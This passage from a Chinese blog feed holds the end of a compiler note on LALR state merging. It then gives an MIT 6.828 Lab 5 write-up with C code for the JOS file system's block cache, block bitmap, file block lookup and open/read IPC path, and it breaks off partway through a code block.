src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310312058793.png"></p><p>来分析一下这样合并的有效性:</p><blockquote><p>是否会引进移进-归约冲突?</p><blockquote><p>不会.进行合并的状态的项目一定有相同的core,对一个core而言,是如何决定进行移进还是归约的?根据·是否到了产生式的结尾.也就是只和core有关而与第二分量无关.有的人可能会说,归约的条件还有一个下一文法符号符合第二分量,但在限定了对一个core而言,这其实是决定归约或报告错误,与移进无关.若合并后存在移进-归约冲突,说明该冲突本身就存在于规范LR(1)分析中,该文法不是LR(1)文法.</p></blockquote><p>是否会引进归约-归约冲突?</p><blockquote><p>可能会.在规范LR(1)中,如何决定进行归约的产生式?由第二分量决定.对于这样两个即将被我们合并的状态,各自在识别下一个符号e和d的时候能够根据第二分量选择正确的产生式,而在合并之后,第二分量相同,无法决定,产生归约-归约冲突.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310311904951.png"></p></blockquote></blockquote><p>简易但耗空间的LALR表的构造.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310311915957.png"></p><p>更efficient的构造方式,还是利用分析过程中通过对核心项目的计算来减小分析表的大小.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310312119100.png"></p><p><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202311031547552.png"></p><p><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202311031548493.png"><br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202311031548887.png"></p>]]></content>
      
      
      <categories>
          
          <category> 学习笔记 </category>
          
          <category> 编译原理 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Syntax-Analysis </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MIT6.828 Lab5</title>
      <link href="/2023/6.828-Lab5/"/>
      <url>/2023/6.828-Lab5/</url>
      
        <content type="html"><![CDATA[<p>最崩溃的一集…Lab倒是很简单,只是文件系统一启用,之前代码的好多问题都显现出来了,然后就是debugggg.</p><h2 id="Lab-5-File-system-Spawn-and-Shell"><a href="#Lab-5-File-system-Spawn-and-Shell" class="headerlink" title="Lab 5: File system, Spawn and Shell"></a>Lab 5: File system, Spawn and Shell</h2><h3 id="Getting-Started"><a href="#Getting-Started" class="headerlink" title="Getting Started"></a>Getting Started</h3><p>切换分支之后编译有点问题,改一改:</p><p><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310241258348.png"><br>在GNUmakefile中加上-Wno-address-of-packed-member</p><p><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310241423170.png"></p><p>将fs.h中定义的全局变量改为外部变量,并在fs.c中定义.</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">extern</span> <span class="class"><span class="keyword">struct</span> <span class="title">Super</span> *<span class="title">super</span>;</span><span class="comment">// superblock</span></span><br><span class="line"><span class="keyword">extern</span> <span class="type">uint32_t</span> *bitmap;<span class="comment">// bitmap blocks mapped in memory</span></span><br></pre></td></tr></tbody></table></figure><p>改下输出,lab4满分通过.</p><h3 id="File-system-preliminaries"><a href="#File-system-preliminaries" class="headerlink" title="File system preliminaries"></a>File system preliminaries</h3><p>文件系统的设计就不在这里说了,详见《HQOS 设计与实现》.</p><span id="more"></span><h3 id="The-File-System"><a href="#The-File-System" class="headerlink" title="The File System"></a>The File System</h3><h4 id="The-Block-Cache"><a href="#The-Block-Cache" class="headerlink" title="The Block Cache"></a>The Block Cache</h4><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Fault any disk block that is read in to memory by</span></span><br><span class="line"><span class="comment">// loading it from disk.</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line"><span class="title function_">bc_pgfault</span><span class="params">(<span class="keyword">struct</span> UTrapframe *utf)</span></span><br><span class="line">{</span><br><span class="line"><span class="type">void</span> *addr = (<span class="type">void</span> *) utf-&gt;utf_fault_va;</span><br><span class="line"><span class="type">uint32_t</span> blockno = ((<span class="type">uint32_t</span>)addr - DISKMAP) / BLKSIZE;</span><br><span class="line"><span class="type">int</span> r;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Check that the fault was within the block cache region</span></span><br><span class="line"><span class="keyword">if</span> (addr &lt; (<span class="type">void</span>*)DISKMAP || addr &gt;= (<span class="type">void</span>*)(DISKMAP + DISKSIZE))</span><br><span class="line">panic(<span class="string">"page fault in FS: eip %08x, va %08x, err %04x"</span>,</span><br><span class="line">      utf-&gt;utf_eip, addr, utf-&gt;utf_err);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Sanity check the block number.</span></span><br><span class="line"><span class="keyword">if</span> (super &amp;&amp; blockno &gt;= super-&gt;s_nblocks)</span><br><span class="line">panic(<span class="string">"reading non-existent block %08x\n"</span>, blockno);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Allocate a page in the disk map region, read the contents</span></span><br><span class="line"><span class="comment">// of the block from the disk into that page.</span></span><br><span class="line"><span class="comment">// Hint: first round addr to page boundary. fs/ide.c has code to read</span></span><br><span class="line"><span class="comment">// the disk.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// LAB 5: you code here:</span></span><br><span class="line">addr = ROUNDDOWN(addr,PGSIZE);</span><br><span class="line"><span class="keyword">if</span>((r = sys_page_alloc(<span class="number">0</span>,addr,PTE_SYSCALL)))</span><br><span class="line">{</span><br><span class="line">panic(<span class="string">"in bc_pgfault, sys_page_alloc: %e"</span>,r);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>((r = ide_read(blockno*BLKSECTS,addr,BLKSECTS)))</span><br><span class="line">{</span><br><span class="line">panic(<span class="string">"in bc_pgfault, ide_read"</span>);</span><br><span class="line">}</span><br><span class="line"><span class="comment">// Clear the dirty bit for the disk block page since we just read the</span></span><br><span class="line"><span class="comment">// block from disk</span></span><br><span class="line"><span class="keyword">if</span> ((r = sys_page_map(<span class="number">0</span>, addr, <span class="number">0</span>, addr, uvpt[PGNUM(addr)] &amp; PTE_SYSCALL)) &lt; <span class="number">0</span>)</span><br><span class="line">panic(<span class="string">"in bc_pgfault, sys_page_map: %e"</span>, r);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Check that the block we read was allocated. (exercise for</span></span><br><span class="line"><span class="comment">// the reader: why do we do this *after* reading the block</span></span><br><span class="line"><span class="comment">// in?)</span></span><br><span class="line"><span class="keyword">if</span> (bitmap &amp;&amp; block_is_free(blockno))</span><br><span class="line">panic(<span class="string">"reading free block %08x\n"</span>, blockno);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">// Flush the contents of the block containing VA out to disk if</span></span><br><span class="line"><span class="comment">// necessary, then clear the PTE_D bit using sys_page_map.</span></span><br><span class="line"><span class="comment">// If the block is not in the block cache or is not dirty, does</span></span><br><span class="line"><span class="comment">// nothing.</span></span><br><span class="line"><span class="comment">// Hint: Use va_is_mapped, va_is_dirty, and ide_write.</span></span><br><span class="line"><span class="comment">// Hint: Use the PTE_SYSCALL constant when calling sys_page_map.</span></span><br><span class="line"><span class="comment">// Hint: Don't forget to round addr down.</span></span><br><span class="line"><span class="type">void</span></span><br><span class="line"><span class="title function_">flush_block</span><span class="params">(<span class="type">void</span> *addr)</span></span><br><span class="line">{</span><br><span class="line"><span class="type">uint32_t</span> blockno = ((<span class="type">uint32_t</span>)addr - DISKMAP) / BLKSIZE;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (addr &lt; (<span class="type">void</span>*)DISKMAP || addr &gt;= (<span class="type">void</span>*)(DISKMAP + DISKSIZE))</span><br><span class="line">panic(<span class="string">"flush_block of bad va %08x"</span>, addr);</span><br><span class="line"></span><br><span class="line"><span class="comment">// LAB 5: Your code here.</span></span><br><span class="line"><span class="type">int</span> r;</span><br><span class="line">addr = ROUNDDOWN(addr,PGSIZE);</span><br><span class="line"><span class="keyword">if</span>(va_is_mapped(addr)&amp;&amp;va_is_dirty(addr))</span><br><span class="line">{</span><br><span class="line"><span class="keyword">if</span>(ide_write(blockno*BLKSECTS,addr,BLKSECTS))</span><br><span class="line">{</span><br><span class="line">panic(<span class="string">"in flush_block, ide_write"</span>);</span><br><span class="line">}</span><br><span class="line"><span class="keyword">if</span>((r = sys_page_map(<span class="number">0</span>,addr,<span class="number">0</span>,addr,uvpt[PGNUM(addr)] &amp; PTE_SYSCALL)))</span><br><span class="line">{</span><br><span class="line">panic(<span class="string">"in flush_block, sys_page_map: %e"</span>,r);</span><br><span class="line">}</span><br><span class="line">}</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><h4 id="The-Block-Bitmap"><a href="#The-Block-Bitmap" class="headerlink" title="The Block Bitmap"></a>The Block Bitmap</h4><p>更改bitmap之后记得刷新bitmap对应块缓存.</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line"><span class="title function_">alloc_block</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">{</span><br><span class="line"><span class="comment">// The bitmap consists of one or more blocks.  A single bitmap block</span></span><br><span class="line"><span class="comment">// contains the in-use bits for BLKBITSIZE blocks.  There are</span></span><br><span class="line"><span class="comment">// super-&gt;s_nblocks blocks in the disk altogether.</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// LAB 5: Your code here.</span></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>;i&lt;super-&gt;s_nblocks;++i)</span><br><span class="line">{</span><br><span class="line"><span class="keyword">if</span>(block_is_free(i))</span><br><span class="line">{</span><br><span class="line">bitmap[i/<span class="number">32</span>] &amp;= ~(<span class="number">1</span>&lt;&lt;(i%<span class="number">32</span>));</span><br><span class="line">flush_block((<span class="type">void</span>*)bitmap+BLKSIZE*(i/BLKBITSIZE));</span><br><span class="line"><span class="keyword">return</span> i;</span><br><span class="line">}</span><br><span class="line">}</span><br><span class="line"><span class="keyword">return</span> -E_NO_DISK;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h4 id="File-Operations"><a href="#File-Operations" class="headerlink" title="File Operations"></a>File Operations</h4><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Find the disk block number slot for the 'filebno'th block in file 'f'.</span></span><br><span class="line"><span class="comment">// Set '*ppdiskbno' to point to that slot.</span></span><br><span class="line"><span class="comment">// The slot will be one of the f-&gt;f_direct[] entries,</span></span><br><span class="line"><span class="comment">// or an entry in the indirect block.</span></span><br><span class="line"><span class="comment">// When 'alloc' is set, this function will allocate an indirect block</span></span><br><span class="line"><span class="comment">// if necessary.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Returns:</span></span><br><span class="line"><span class="comment">//0 on success (but note that *ppdiskbno might equal 0).</span></span><br><span class="line"><span class="comment">//-E_NOT_FOUND if the function needed to allocate an indirect block, but</span></span><br><span class="line"><span class="comment">//alloc was 0.</span></span><br><span class="line"><span class="comment">//-E_NO_DISK if there's no space on the disk for an indirect block.</span></span><br><span class="line"><span class="comment">//-E_INVAL if filebno is out of range (it's &gt;= NDIRECT + NINDIRECT).</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Analogy: This is like pgdir_walk for files.</span></span><br><span class="line"><span class="comment">// Hint: Don't forget to clear any block you allocate.</span></span><br><span class="line"><span class="type">static</span> <span class="type">int</span></span><br><span class="line"><span class="title function_">file_block_walk</span><span class="params">(<span class="keyword">struct</span> File *f, <span class="type">uint32_t</span> filebno, <span class="type">uint32_t</span> **ppdiskbno, <span class="type">bool</span> alloc)</span></span><br><span class="line">{</span><br><span class="line">    <span class="comment">// LAB 5: Your code here.</span></span><br><span class="line"><span class="type">int</span> r;</span><br><span class="line"><span class="keyword">if</span>(filebno &gt;= NDIRECT+NINDIRECT)</span><br><span class="line"><span class="keyword">return</span> -E_INVAL;</span><br><span class="line"><span class="keyword">if</span>(filebno&lt;NDIRECT)</span><br><span class="line">{</span><br><span class="line">*ppdiskbno = &amp;(f-&gt;f_direct[filebno]);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">{</span><br><span class="line"><span class="keyword">if</span>(f-&gt;f_indirect==<span class="number">0</span>)</span><br><span class="line">{</span><br><span class="line"><span class="keyword">if</span>(alloc)</span><br><span class="line">{</span><br><span class="line"><span class="keyword">if</span>((r = alloc_block())&lt;<span class="number">0</span>)</span><br><span class="line">{</span><br><span class="line"><span class="keyword">return</span> r;</span><br><span class="line">}</span><br><span class="line"><span class="built_in">memset</span>(diskaddr(r), <span class="number">0</span>, BLKSIZE);</span><br><span class="line">f-&gt;f_indirect = r;</span><br><span class="line">}</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">return</span> -E_NOT_FOUND;</span><br><span class="line">}</span><br><span class="line">*ppdiskbno = &amp;(((<span class="type">uint32_t</span>*)(diskaddr(f-&gt;f_indirect)))[filebno-NDIRECT]);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">// Set *blk to the address in memory where the filebno'th</span></span><br><span class="line"><span class="comment">// block of file 'f' would be mapped.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Returns 0 on success, &lt; 0 on error.  Errors are:</span></span><br><span class="line"><span class="comment">//-E_NO_DISK if a block needed to be allocated but the disk is full.</span></span><br><span class="line"><span class="comment">//-E_INVAL if filebno is out of range.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Hint: Use file_block_walk and alloc_block.</span></span><br><span class="line"><span class="type">int</span></span><br><span class="line"><span class="title function_">file_get_block</span><span class="params">(<span class="keyword">struct</span> File *f, <span class="type">uint32_t</span> filebno, <span class="type">char</span> **blk)</span></span><br><span class="line">{</span><br><span class="line">    <span class="comment">// LAB 5: Your code here.</span></span><br><span class="line"><span class="type">uint32_t</span>* ppdisk;</span><br><span class="line"><span class="type">int</span> r;</span><br><span class="line"><span class="keyword">if</span>((r = file_block_walk(f,filebno,&amp;ppdisk,<span class="number">1</span>)))</span><br><span class="line">{</span><br><span class="line"><span class="keyword">return</span> r;</span><br><span class="line">}</span><br><span class="line"><span class="keyword">if</span>(*ppdisk==<span class="number">0</span>)</span><br><span class="line">{</span><br><span class="line"><span class="keyword">if</span>((r = alloc_block())&lt;<span class="number">0</span>)</span><br><span class="line">{</span><br><span class="line"><span class="keyword">return</span> r;</span><br><span class="line">}</span><br><span class="line">*ppdisk = r;</span><br><span class="line"><span class="built_in">memset</span>(diskaddr(r), <span class="number">0</span>, BLKSIZE);</span><br><span class="line">}</span><br><span class="line">*blk = diskaddr(*ppdisk);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h4 id="The-file-system-interface"><a href="#The-file-system-interface" class="headerlink" title="The file system interface"></a>The file system interface</h4><h5 id="用户文件读写流程分析"><a href="#用户文件读写流程分析" class="headerlink" title="用户文件读写流程分析"></a>用户文件读写流程分析</h5><h6 id="open"><a href="#open" class="headerlink" title="open"></a>open</h6><p>用户进程使用lib中的open函数,指定文件路径和以何种模式打开.open函数为进程分配一个未使用的文件描述符号fd,对应着0xD0000000处MAXFD个struct Fd结构中的一个.然后通过IPC进程间通信向fs server进程发送FSREQ_OPEN的请求.</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line"><span class="title function_">open</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *path, <span class="type">int</span> mode)</span></span><br><span class="line">{</span><br><span class="line"><span class="type">int</span> r;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Fd</span> *<span class="title">fd</span>;</span></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">strlen</span>(path) &gt;= MAXPATHLEN)</span><br><span class="line"><span class="keyword">return</span> -E_BAD_PATH;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ((r = fd_alloc(&amp;fd)) &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">return</span> r;</span><br><span class="line"></span><br><span class="line"><span class="built_in">strcpy</span>(fsipcbuf.open.req_path, path);</span><br><span class="line"></span><br><span class="line">fsipcbuf.open.req_omode = mode;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ((r = fsipc(FSREQ_OPEN, fd)) &lt; <span class="number">0</span>) {</span><br><span class="line">fd_close(fd, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">return</span> r;</span><br><span class="line">}</span><br><span class="line"><span class="keyword">return</span> fd2num(fd);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>server进程接收到open请求,根据模式尝试打开(创建)文件:先调用openfile_alloc函数在opentab中分配一个struct OpenFile结构o,包括为o-&gt;fd分配物理页.然后调用file_open,从根目录开始遍历直到找到用户请求文件的struct File结构(JOS实现中目录的内容即是目录中的文件的struct File结构),设置o-&gt;file指向该结构.通过IPC通信的交互,最终实现将为o-&gt;fd分配的物理页映射到用户进程中该fd结构的对应虚拟地址.</p><p>这里理解一下openfile_alloc函数中的case1.当该opentab条目的o_fd还未使用过,分配一个物理页,此时pageref为1,再映射到用户,pageref为2,下一次打开文件就应该跳过这个条目.若pageref为1时,意味着除了fs server本身,已经没有用户进程使用该文件,所以该条目依然为free状态,可以分配.</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Allocate an open file.</span></span><br><span class="line"><span class="type">int</span></span><br><span class="line"><span class="title function_">openfile_alloc</span><span class="params">(<span class="keyword">struct</span> OpenFile **o)</span></span><br><span class="line">{</span><br><span class="line"><span class="type">int</span> i, r;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Find an available open-file table entry</span></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; MAXOPEN; i++) {</span><br><span class="line"><span class="keyword">switch</span> (pageref(opentab[i].o_fd)) {</span><br><span class="line"><span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line"><span class="keyword">if</span> ((r = sys_page_alloc(<span class="number">0</span>, opentab[i].o_fd, PTE_P|PTE_U|PTE_W)) &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">return</span> r;</span><br><span class="line"><span class="comment">/* fall through */</span></span><br><span class="line"><span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">opentab[i].o_fileid += MAXOPEN;</span><br><span class="line">*o = &amp;opentab[i];</span><br><span class="line"><span class="built_in">memset</span>(opentab[i].o_fd, <span class="number">0</span>, PGSIZE);</span><br><span class="line"><span class="keyword">return</span> (*o)-&gt;o_fileid;</span><br><span class="line">}</span><br><span class="line">}</span><br><span class="line"><span class="keyword">return</span> -E_MAX_OPEN;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>既然未来的读写操作都是server完成的,把o-&gt;fd映射到用户进程有什么用呢?从代码上能看出来的用途大概是1)对某文件打开模式的检查 2)将对特定文件类型(devid)的IO操作dispatch到特定的函数实现,如devfile,pipe,console.</p><p>(<del>这Fd映射还是以可写权限映射的,没道理</del>)</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">Dev</span> *<span class="title">devtab</span>[] =</span></span><br><span class="line">{</span><br><span class="line">&amp;devfile,</span><br><span class="line">&amp;devsock,</span><br><span class="line">&amp;devpipe,</span><br><span class="line">&amp;devcons,</span><br><span class="line"><span class="number">0</span></span><br><span class="line">};</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Dev</span> <span class="title">devfile</span> =</span></span><br><span class="line">{</span><br><span class="line">.dev_id =<span class="string">'f'</span>,</span><br><span class="line">.dev_name =<span class="string">"file"</span>,</span><br><span class="line">.dev_read =devfile_read,</span><br><span class="line">.dev_close =devfile_flush,</span><br><span class="line">.dev_stat =devfile_stat,</span><br><span class="line">.dev_write =devfile_write,</span><br><span class="line">.dev_trunc =devfile_trunc</span><br><span class="line">};</span><br></pre></td></tr></tbody></table></figure><h6 id="read"><a href="#read" class="headerlink" title="read"></a>read</h6><p>lib中的read函数根据文件的类型(devid)分发到特定的IO函数实现,这里以devfile_read为例.</p><p>向server发送FSREQ_READ请求,server从硬盘中读取对应文件数据到内存(别忘了JOS实现中是将整个3GB的硬盘映射到fs server的虚拟地址空间中)中,再经两次拷贝到用户进程要求的缓冲区中.</p><p>可以看出devfile_read设计成每次最多读取PGSIZE字节,因为这受限于我们的IPC机制.记得在server_read中处理参数n防止缓冲区溢出.</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">ssize_t</span></span><br><span class="line"><span class="title function_">devfile_read</span><span class="params">(<span class="keyword">struct</span> Fd *fd, <span class="type">void</span> *buf, <span class="type">size_t</span> n)</span></span><br><span class="line">{</span><br><span class="line"><span class="comment">// Make an FSREQ_READ request to the file system server after</span></span><br><span class="line"><span class="comment">// filling fsipcbuf.read with the request arguments.  The</span></span><br><span class="line"><span class="comment">// bytes read will be written back to fsipcbuf by the file</span></span><br><span class="line"><span class="comment">// system server.</span></span><br><span class="line"><span class="type">int</span> r;</span><br><span class="line"></span><br><span class="line">fsipcbuf.read.req_fileid = fd-&gt;fd_file.id;</span><br><span class="line">fsipcbuf.read.req_n = n;</span><br><span class="line"><span class="keyword">if</span> ((r = fsipc(FSREQ_READ, <span class="literal">NULL</span>)) &lt; <span class="number">0</span>)</span><br><span class="line">{</span><br><span class="line"><span class="keyword">return</span> r;</span><br><span class="line"></span><br><span class="line">}</span><br><span class="line">assert(r &lt;= n);</span><br><span class="line">assert(r &lt;= PGSIZE);</span><br><span class="line">memmove(buf, fsipcbuf.readRet.ret_buf, r);</span><br><span class="line"><span class="keyword">return</span> r;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>实现中的union Fsipc挺有意思.</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">union</span> <span class="title">Fsipc</span> {</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Fsret_read</span> {</span></span><br><span class="line"><span class="type">char</span> ret_buf[PGSIZE];</span><br><span class="line">} readRet;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h6 id="write"><a href="#write" class="headerlink" title="write"></a>write</h6><p>和read区别不大.</p><h5 id="lab代码"><a href="#lab代码" class="headerlink" title="lab代码"></a>lab代码</h5><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span 